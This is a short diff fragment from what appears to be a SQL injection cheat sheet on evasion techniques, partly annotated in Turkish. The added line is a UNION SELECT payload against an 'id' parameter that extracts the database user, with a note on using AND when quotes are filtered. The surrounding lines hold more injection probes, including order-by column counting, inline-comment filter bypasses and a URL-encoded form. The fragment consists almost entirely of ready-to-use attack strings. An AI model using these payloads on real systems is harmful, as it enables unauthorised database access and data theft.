@@ -183,6 +183,9 @@ Evasion tecnniques
   *-1' or 2>1-- +
 -1' /*!12345order*/ by 7#
 
+?id=1 AND union select 1,2,3,4,user(),6,7,8,9 -- - -> eğer tırnak koyamıyorsak AND querysini kullanabiliriz.
+
+
 1' order by 8 -- +
    urlencoder : 1%27%20order%20by%208%20--%20%2B
    hex
